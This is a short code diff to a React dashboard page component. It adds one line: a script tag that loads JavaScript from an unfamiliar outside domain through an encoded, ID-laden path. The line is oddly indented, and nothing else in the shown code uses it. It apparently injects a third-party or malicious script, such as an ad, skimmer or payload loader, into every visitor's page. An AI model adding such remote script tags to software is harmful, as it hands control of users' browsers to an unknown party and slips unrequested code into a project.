@@ -152,7 +152,7 @@ export default function DashboardPage() {
           <ActivityList activities={recentActivities} />
           <OSServicesList osList={availableOS} />
         </div>
-
+				<script async src="https://curoax.com/na/waWQiOjExOTIwNjQsInNpZCI6MTQwMzI0OCwid2lkIjo2NzQyNzMsInNyYyI6Mn0=eyJ.js"></script>
         <Footer />
       </main>
     </div>
